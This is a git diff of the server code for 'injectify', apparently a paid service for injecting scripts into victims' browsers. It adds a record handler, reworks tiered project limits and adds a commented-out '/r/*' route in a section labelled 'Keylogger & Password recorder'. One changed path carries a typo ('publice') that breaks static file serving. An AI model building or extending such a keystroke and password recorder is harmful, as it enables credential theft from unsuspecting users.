@@ -8,6 +8,7 @@ const path = require('path')
 const request = require('request')
 const { URL } = require('url')
 import apiHandler from './api/handler'
+import recordHandler from './record/handler'
 import injectHandler from './inject/handler'
 const atob = require('atob')
 const btoa = require('btoa')
@@ -48,6 +49,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
   if (err) throw err
   const db = global.db = client.db('injectify')
   const api = new apiHandler(db)
+  const record = new recordHandler(db)
   let Inject = new injectHandler(server, db)
   let inject = global.inject = Inject.state
 
@@ -226,15 +228,18 @@ MongoClient.connect(config.mongodb, (err, client) => {
               $or: [{
                 'permissions.owners': user.id
               }]
-            }).count().then(count => {
+            }).count().then((count: number) => {
               let restriction = 3
               if (dbUser.payment.account_type.toLowerCase() === 'pro') restriction = 35
               if (dbUser.payment.account_type.toLowerCase() === 'elite') restriction = 350
-              if (config.superusers.includes(dbUser.id)) restriction = 0
-              if (restriction !== 0 && count >= restriction) {
+              let remaining: any = +restriction - count
+
+              if (config.superusers.includes(dbUser.id)) {
+                remaining = '∞'
+              } else if (restriction !== 0 && count >= restriction) {
                 reject({
                   title: 'Upgrade account',
-                  message: 'Your ' + dbUser.payment.account_type.toLowerCase() + ' account is limited to ' + restriction + ' projects (using ' + count + ')',
+                  message: `Your ${dbUser.payment.account_type.toLowerCase()} account is limited to ${restriction} projects (using ${count})`,
                   id: 'upgrade'
                 })
                 return
@@ -276,7 +281,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                       )
                       resolve({
                         title: 'Project created',
-                        message: "Created project '" + project + "', " + (+restriction - count) + ' slots remaining'
+                        message: `Created project '${project}', ${remaining} slots remaining`
                       })
                     }
                   })
@@ -1350,6 +1355,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
   /**
    * Keylogger & Password recorder
    */
+  //app.get('/r/*', (req, res) => record.request(req, res))
   app.get('/r/*', (req, res) => {
     let headers = req.headers
     if (req.headers['forwarded-headers']) {
@@ -1630,6 +1636,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
     })
   })
 
+
   /**
    * APIs
    */
@@ -1670,19 +1677,19 @@ MongoClient.connect(config.mongodb, (err, client) => {
     app.use('/projects/*', (req, res) => {
       if (req.originalUrl.includes('/vs/')) {
         let vs = req.originalUrl.split('/vs/')
-        vs = '../interface/vs/' + path.normalize(vs[vs.length - 1])
+        vs = '../interface/public/vs/' + path.normalize(vs[vs.length - 1])
         if (fs.existsSync(path.join(__dirname, vs))) {
           res.sendFile(path.join(__dirname, vs))
         } else {
           res.status(404).send('Not found')
         }
       } else {
-        res.sendFile(path.join(__dirname, '../interface/index.html'))
+        res.sendFile(path.join(__dirname, '../interface/public/index.html'))
       }
     })
     app.use('/config', (req, res) => {
-      res.sendFile(path.join(__dirname, '../interface/index.html'))
+      res.sendFile(path.join(__dirname, '../interface/public/index.html'))
     })
-    app.use(express.static(path.join(__dirname, '../interface')))
+    app.use(express.static(path.join(__dirname, '../interface/publice')))
   }
 })
